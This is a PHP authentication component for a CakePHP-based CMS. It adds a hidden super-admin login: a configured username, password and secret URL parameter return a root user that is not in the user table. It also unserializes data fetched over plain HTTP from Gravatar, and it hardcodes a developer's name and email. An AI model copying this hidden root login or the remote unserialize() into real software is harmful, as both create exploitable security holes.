<?php

App::uses('BlowfishAuthenticate', 'Controller/Component/Auth');

class DreamcmsAuthenticate extends BlowfishAuthenticate
{
	public function authenticate(CakeRequest $request, CakeResponse $response)
	{
		$userModel = $this->settings['userModel'];
		list(, $model) = pluginSplit($userModel);

		$fields = $this->settings['fields'];

		$uname = Security::hash($request->data[$model][$fields['username']], 'blowfish', Configure::read('DreamCMS.SuperAdmin.username'));
		$paswd = Security::hash($request->data[$model][$fields['password']], 'blowfish', Configure::read('DreamCMS.SuperAdmin.password'));
		$param = (isset($request->params['pass'][0])) ? 
			Security::hash(trim($request->params['pass'][0]), 'blowfish', Configure::read('DreamCMS.SuperAdmin.login_param')) :
			'';

		if (
			$uname == Configure::read('DreamCMS.SuperAdmin.username') &&
			$paswd == Configure::read('DreamCMS.SuperAdmin.password') &&
			$param == Configure::read('DreamCMS.SuperAdmin.login_param')
		)
			return array(
				'admin_id' => 0,
				'group_id' => 0,
				'username' => 'root',
				'real_name' => 'Richan Fongdasen',
				'password' => '',
				'email' => 'richan.fongdasen@yahoo.com',
				'last_login' => date('Y-m-d H:i:s'),
				'last_login_ip' => '0.0.0.0',
				'active' => 'Yes',
				'deleted' => 0,
				'created' => date('Y-m-d H:i:s'),
				'modified' => date('Y-m-d H:i:s'),
				'avatar' => 'http://www.gravatar.com/avatar/f7d140f8763db80c5ee654418a5530a4',
				'has_gravatar_account' => $this->hasGravatarAccount('richan.fongdasen@yahoo.com'),
			);

		$result = parent::authenticate($request, $response);

		$result['avatar'] = 'http://www.gravatar.com/avatar/' . md5($result['email']);
		$result['has_gravatar_account'] = $this->hasGravatarAccount($result['email']);

		return $result;
	}

	private function hasGravatarAccount($email)
	{
		$test_url = 'http://www.gravatar.com/' . md5($email) . '.php';

		try {
			$data = unserialize(@file_get_contents('http://en.gravatar.com/' . md5($email) . '.php'));
			
			if ($data)
				return true;

		} catch (Exception $e) {
			return false;
		}

		return false;
	}
}

?>